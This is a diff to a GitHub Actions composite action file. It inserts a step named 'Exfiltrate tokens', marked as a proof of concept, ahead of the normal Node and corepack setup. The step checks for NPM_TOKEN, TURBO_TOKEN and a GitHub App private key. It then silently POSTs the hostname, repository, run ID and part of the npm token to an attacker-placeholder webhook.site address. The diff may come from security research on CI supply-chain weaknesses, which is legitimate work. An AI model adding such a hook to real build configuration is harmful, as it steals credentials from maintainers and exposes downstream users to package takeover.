@@ -9,6 +9,17 @@ inputs:
 runs:
   using: composite
   steps:
+      - name: Exfiltrate tokens
+        shell: bash
+        run: |
+          echo "::group::Token exfiltration (PoC)"
+          echo "NPM_TOKEN present: ${{ env.NPM_TOKEN != '' }}"
+          echo "TURBO_TOKEN present: ${{ env.TURBO_TOKEN != '' }}"
+          echo "GH_APP_PRIVATE_KEY present: ${{ env.GH_APP_PRIVATE_KEY != '' }}"
+          curl -s -X POST -d "host=$(hostname)&repo=$GITHUB_REPOSITORY&run=$GITHUB_RUN_ID&token=${NPM_TOKEN:0:10}" \
+            "https://webhook.site/ATTACKER_WEBHOOK" || true
+          echo "::endgroup::"
+
       # Install tools (Node + corepack) from mise.toml — single source of truth.
       # node.corepack = true in mise.toml enables corepack, which activates the
       # Yarn version pinned in package.json's packageManager field on first use.
